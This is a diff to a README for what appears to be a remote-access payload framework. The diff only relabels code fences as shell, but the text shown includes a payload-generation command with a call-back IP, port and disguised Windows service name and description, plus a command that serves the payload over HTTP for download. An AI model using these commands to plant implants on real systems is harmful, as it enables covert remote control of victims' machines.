@@ -41,7 +41,7 @@ Next, open the Java project and build it
 
 ### Set-up payload
 Finally, generate a payload with ``python3 GenPayload.py``:
-```
+```sh
 # Example of a generated payload for:
 # Windows 64-bit architecture
 # Call-back ip: 10.10.50.173
@@ -56,7 +56,7 @@ Finally, generate a payload with ``python3 GenPayload.py``:
 python3 GenPayload.py -os 1 -hh 10.10.50.173 -p 80 -bp 9090 -i 5 -a 64 -stn "stdinit" -sn "LinkControlFlow" -bn "tsrfhelper" -sd "Provides the best media in the seven seas"
 ```
 The command will then output:
-```
+```sh
 [+] Run the following on host:
 
 cd Beam/Windows; python3 -m http.server 9090
